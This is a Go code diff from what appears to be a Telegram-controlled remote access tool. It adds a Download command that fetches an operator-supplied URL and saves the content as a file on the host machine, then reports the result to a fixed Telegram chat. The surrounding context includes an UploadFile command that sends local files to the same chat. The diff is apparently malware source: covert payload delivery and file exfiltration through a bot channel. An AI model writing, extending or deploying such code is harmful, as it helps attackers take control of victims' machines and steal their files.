@@ -2,8 +2,11 @@ package commands
 
 import (
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
+	"strings"
 	"time"
 
 	"github.com/Raffy27/Hydra/api"
@@ -55,4 +58,33 @@ func UploadFile(file string) {
 		return
 	}
 	api.Bot.Send(tgbotapi.NewDocumentUpload(util.ChatID, file))
+}
+
+//Download attempts do download a file and save it.
+func Download(args string) {
+	arr := strings.SplitN(args, " ", 2)
+	url, fn := arr[0], arr[1]
+	cfg := tgbotapi.NewMessage(util.ChatID, "xd")
+	defer api.Bot.Send(&cfg)
+
+	res, err := http.Get(url)
+	if err != nil {
+		cfg.Text = err.Error()
+		return
+	}
+	defer res.Body.Close()
+
+	file, err := os.Create(fn)
+	if err != nil {
+		cfg.Text = err.Error()
+		return
+	}
+	defer file.Close()
+
+	_, err = io.Copy(file, res.Body)
+	if err != nil {
+		cfg.Text = err.Error()
+	} else {
+		cfg.Text = fmt.Sprintf("File saved as `%s`", strings.ReplaceAll(fn, "`", "\\`"))
+	}
 }
